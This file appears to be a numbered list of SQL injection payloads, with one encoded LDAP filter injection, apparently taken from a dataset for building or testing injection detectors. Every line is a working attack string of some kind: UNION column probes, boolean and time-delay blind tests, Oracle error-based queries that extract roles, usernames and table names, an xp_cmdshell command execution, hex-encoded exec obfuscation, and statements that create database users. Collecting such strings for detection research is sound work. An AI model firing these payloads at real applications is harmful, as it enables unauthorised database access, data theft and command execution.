1 -8159 where 2793  =  2793 union all select 2793,2793,2793,2793,2793# 
10 t'exec master..xp_cmdshell 'nslookup www.google.com'-- 
50 -9484' or   (  7129  =  2349  )  *2349 and 'fcsa' like 'fcsa 
61  or 'something'   =   'some'+'thing' 
82 1'+  (  select iutk where 6158  =  6158 
83 -4885 union all select 4589,4589,4589,4589,4589,4589,4589,4589,4589,4589# 
89 1  )   where 4992  =  4992 
101 1 where 2060  =  2060 
113 -2071 union all select 4753,4753-- 
119 -5560"   )    )    or 7292  =  6184# 
133  AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i 
143 -5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153# 
168 1" where 7796  =  7796 
179 1'  )   as rhvm where 1420  =  1420 
182 -- &password  =  
203  (  8266  =  8266  )  *9900 
205 1234 " AND 1  =  0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055 
256 select * from information_schema.tables-- 
321 1  )   where 5629  =  5629 
322 if  (  3392  =  4422  )   select 3392 else drop function xsqq-- 
327 1'  )   where 8707  =  8707 and 3210  =  1477-- 
328 -3130  )   union all select 1741,1741,1741,1741,1741,1741,1741,1741# 
332 -9393' where 3119  =  3119 or 8571  =  8571-- 
346 1%" and 2805  =  1345 
365 -5386'  )   union all select 8026,8026,8026,8026,8026,8026# 
382  AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i 
384 1  )   as lisg where 5490  =  5490 
388 -4494 or 5291  =  4452 
402 1  )   where 8671  =  8671 and make_set  (  4931  =  1642,1642  )  -- 
426 insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )    
432 %2A%28%7C%28objectclass%3D%2A%29%29 
435 1" and elt  (  4594  =  1040,1040  )   
447 1"  )   as pobe where 1704  =  1704 
499 or 'something'   =   'some'+'thing' 
503 -8633" or 5099  =  5974 
508  AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i 
514 1'+  (  select hett where 7228  =  7228 
540 1 uni/**/on select all from where 
555 create user name identified by 'pass123' 
568 -6639'  )   as trll where 6271  =  6271 union all select 6271,6271,6271# 
575 if  (  4735  =  8907  )   select 4735 else drop function qigo-- 
601 -4817 union all select 7415,7415,7415,7415,7415,7415,7415,7415,7415# 
608 -7006' where 6966  =  6966 union all select 6966,6966,6966,6966# 
624 1"  )   as aifd where 5962  =  5962 
635 -8881%' union all select 8420,8420,8420,8420,8420,8420,8420# 
646 if  (  8284  =  6171  )   select 8284 else drop function mbih-- 
674 1"  )   as semi where 4260  =  4260 
693 waitfor delay '0:0:5' and 'gsvt'  =  'gsvt 
708 1"  )   where 4112  =  4112 
710 ns 
749 1  )   where 9344  =  9344 
758 \x27UNION SELECT 
797 declare @s varchar  (  200  )   select @s   =   0x77616974 ... 
798 -2223'   )    )    as mjwp where 8650  =  8650 or 7900  =  5838 
810 1' where 1593  =  1593 
834 1" where 2619  =  2619 and 2823  =  5100# 
868 -9958"  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741# 
883 1  )   as tbve where 4828  =  4828 
921 1  )   where 7026  =  7026 
947 1"  )   as dgzf where 4834  =  4834 
959 -8868"  )   where 5681  =  5681 union all select 5681,5681,5681,5681,5681,5681,5681,5681,5681,5681-- 
984 make_set  (  5679  =  9769,9769  )   
990 1'+  (  select dklj where 3265  =  3265 
993 1'  )   where 5871  =  5871 
1006 1"  )   where 1833  =  1833 
1012 if  (  8995  =  9787  )   select 8995 else drop function ofgg-- 
1022 elt  (  2567  =  9921,9921  )   
1058 1"  )   where 4951  =  4951 
1072 1"  )   where 7548  =  7548 
1087 declare @q nvarchar   (  200  )   0x730065006c00650063007400200040004000760065007200730069006f006e00 exec  (  @q  )  
1091 1'+  (  select 'dhcv' where 9372  =  9372 
1094 ^' 
1135 -8933  )   as iiyr where 1974  =  1974 union all select 1974,1974,1974,1974,1974# 
1143 iif  (  1217  =  8831,1,1/0  )   
